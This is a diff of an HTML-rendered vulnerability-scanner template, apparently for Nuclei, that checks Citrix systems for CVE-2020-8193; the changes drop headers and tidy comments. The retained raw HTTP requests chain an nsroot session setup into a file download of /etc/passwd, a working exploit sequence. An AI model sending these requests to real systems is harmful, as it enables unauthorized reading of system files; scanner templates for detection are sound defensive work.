@@ -902,7 +902,6 @@
   <span class="nt">severity</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">high</span>
 
   <span class="c1"># Source:- https://github.com/jas502n/CVE-2020-8193</span>
-  <span class="c1"># This template covers only the detection part, use the above exploit for the exploit confirmation.</span>
 
 <span class="nt">requests</span><span class="p">:</span>
   <span class="p p-Indicator">-</span> <span class="nt">raw</span><span class="p">:</span>
@@ -920,7 +919,6 @@
         <span class="no">GET /menu/ss?sid=nsroot&amp;username=nsroot&amp;force_setup=1 HTTP/1.1</span>
         <span class="no">Host: {{Hostname}}</span>
         <span class="no">User-Agent: python-requests/2.24.0</span>
-        <span class="no">Accept-Encoding: gzip, deflate</span>
         <span class="no">Accept: */*</span>
         <span class="no">Connection: close</span>
 
@@ -928,7 +926,6 @@
         <span class="no">GET /menu/neo HTTP/1.1</span>
         <span class="no">Host: {{Hostname}}</span>
         <span class="no">User-Agent: python-requests/2.24.0</span>
-        <span class="no">Accept-Encoding: gzip, deflate</span>
         <span class="no">Accept: */*</span>
         <span class="no">Connection: close</span>
 
@@ -936,7 +933,6 @@
         <span class="no">GET /menu/stc HTTP/1.1</span>
         <span class="no">Host: {{Hostname}}</span>
         <span class="no">User-Agent: python-requests/2.24.0</span>
-        <span class="no">Accept-Encoding: gzip, deflate</span>
         <span class="no">Accept: */*</span>
         <span class="no">Connection: close</span>
 
@@ -944,7 +940,6 @@
         <span class="no">POST /pcidss/report?type=allprofiles&amp;sid=loginchallengeresponse1requestbody&amp;username=nsroot&amp;set=1 HTTP/1.1</span>
         <span class="no">Host: {{Hostname}}</span>
         <span class="no">User-Agent: python-requests/2.24.0</span>
-        <span class="no">Accept-Encoding: gzip, deflate</span>
         <span class="no">Accept: */*</span>
         <span class="no">Connection: close</span>
         <span class="no">Content-Type: application/xml</span>
@@ -958,7 +953,6 @@
         <span class="no">POST /rapi/filedownload?filter=path:%2Fetc%2Fpasswd HTTP/1.1</span>
         <span class="no">Host: {{Hostname}}</span>
         <span class="no">User-Agent: python-requests/2.24.0</span>
-        <span class="no">Accept-Encoding: gzip, deflate</span>
         <span class="no">Accept: */*</span>
         <span class="no">Connection: close</span>
         <span class="no">Content-Type: application/xml</span>
@@ -970,7 +964,7 @@
 
     <span class="nt">cookie-reuse</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">true</span>
 
-    <span class="c1"># Using cookie-reuse to maintain session between each request, same as browser. </span>
+    <span class="c1"># Using cookie-reuse to maintain session between each request, same as browser.</span>
 
     <span class="nt">extractors</span><span class="p">:</span>
       <span class="p p-Indicator">-</span> <span class="nt">type</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">regex</span>
@@ -980,7 +974,7 @@
         <span class="nt">regex</span><span class="p">:</span>
           <span class="p p-Indicator">-</span> <span class="s">&quot;(?m)[0-9]{3,10}\\.[0-9]+&quot;</span>
 
-        <span class="c1"># Using rand_key as dynamic variable to make use of extractors at run time.</span>
+    <span class="c1"># Using rand_key as dynamic variable to make use of extractors at run time.</span>
 
 
     <span class="nt">matchers</span><span class="p">:</span>
